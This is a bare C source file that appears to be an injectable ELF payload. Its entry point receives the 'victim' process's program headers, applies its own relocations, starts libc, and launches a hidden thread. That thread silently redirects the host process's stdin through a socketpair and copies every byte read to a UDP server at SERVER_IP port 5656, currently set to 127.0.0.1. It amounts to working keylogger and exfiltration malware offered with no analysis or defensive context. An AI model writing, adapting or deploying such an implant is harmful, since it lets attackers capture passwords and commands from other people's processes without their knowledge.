
#include <stdint.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <linux/sched.h>
#include <sched.h>

#include <elf.h>

#include <stdlib.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/epoll.h>

#include <errno.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 5656
#define TIM_BUFFER_SIZE 64
#define IO_BUFFER_SIZE 4096

void __init_libc(char **envp, char *pn);
void __libc_start_init(void);

static char buffer[512];
static char buffer_io[IO_BUFFER_SIZE];
static char time_buffer[TIM_BUFFER_SIZE];

static void do_rela_reloc(uint64_t base, Elf64_Rela *rela, size_t count)
{
    sprintf(buffer, "Found .rela at %lx, contains %lu items. \r\n", (uint64_t)rela, count);
    write(1, buffer, strlen(buffer));

    for (int i = 0; i < count ; i++)
    {
        switch (rela[i].r_info & 0xffffffff) 
        {
        case R_X86_64_RELATIVE:
            *(uint64_t*)(rela[i].r_offset + base) = base + rela[i].r_addend;
            sprintf(buffer, "Wrote base+0x%lx to base+0x%lx. \r\n", rela[i].r_addend, rela[i].r_offset);
            write(1, buffer, strlen(buffer));
            break;
        default:
            break;
        }
    }
}

static void do_reloc(uint64_t base, Elf64_Dyn *dynmaic)
{
    int i = 0;
    size_t rela_sz = 0, rela_ent = 0;
    Elf64_Rela *rela_ptr = NULL;

    while (dynmaic[i].d_tag != DT_NULL)
    {
        switch (dynmaic[i].d_tag)
        {
        case DT_RELASZ:
            rela_sz = dynmaic[i].d_un.d_val;
            break;
        case DT_RELAENT:
            rela_ent = dynmaic[i].d_un.d_val;
            break;
        case DT_RELA:
            rela_ptr = (Elf64_Rela*)(dynmaic[i].d_un.d_ptr + base);
            break;
        default:
            break;
        }

        i++;
    }

    if (rela_ptr)
    {
        do_rela_reloc(base, rela_ptr, rela_sz / rela_ent);
    }
}

static void get_current_time(char *buffer, size_t buffer_size) 
{
    time_t raw_time;
    struct tm *time_info;

    // The `time()` function in the C library attempts to use the VDSO,
    // but since we have not initialized it,
    // we need to fallback to the raw system call
    syscall(201, &raw_time);

    time_info = localtime(&raw_time);
    strftime(buffer, buffer_size, "%Y:%m:%d %H:%M:%S \r\n", time_info);
}

void time_thread()
{
    int save_stdin = dup(STDIN_FILENO);
    int pipe[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, pipe);
    dup2(pipe[0], STDIN_FILENO);
    close(pipe[0]);

    int remote = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_zero = 0,
        .sin_port = htons(SERVER_PORT),
        .sin_addr = inet_addr(SERVER_IP)
    };

    int ep = epoll_create1(0);
    struct epoll_event ev = {
        .events = EPOLLIN | EPOLLERR | EPOLLHUP,
        .data.fd = save_stdin
    };

    epoll_ctl(ep, EPOLL_CTL_ADD, save_stdin, &ev);

    while (1)
    {
        struct epoll_event events[3];
        int nready = epoll_wait(ep, events, 3, -1);

        if (nready < 0 && errno != EINTR)
            break;

        for (int i = 0; i < nready; i += 1)
        {
            int fd = events[i].data.fd;
            uint32_t re = events[i].events;

            if ((re & (EPOLLERR | EPOLLHUP)) != 0)
                exit(0);

            if (re & EPOLLIN)
            {
                ssize_t r = read(fd, buffer_io, IO_BUFFER_SIZE);
                write(pipe[1], buffer_io, r);
                sendto(remote, buffer_io, r, 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_in));
            }
        }
    }
}

int create_thread(uint64_t flags, void* stacktop, void(*entry)());

int embedded(uint64_t base, Elf64_Dyn *self_dynmaic, Elf64_Phdr *victim_phdr, char** envp)
{
    do_reloc(base, self_dynmaic);
    printf("Booting... base=0x%lx, dynamic=0x%lx, victim_phdr=0x%lx. \r\n", base, (uint64_t)self_dynmaic, (uint64_t)victim_phdr);
    
    __init_libc(envp, "Shell");
    __libc_start_init();

    uint8_t *stack = malloc(0x4000);
    int cc = create_thread(
        CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD,
        stack + 0x2000, time_thread);

    return 0;
}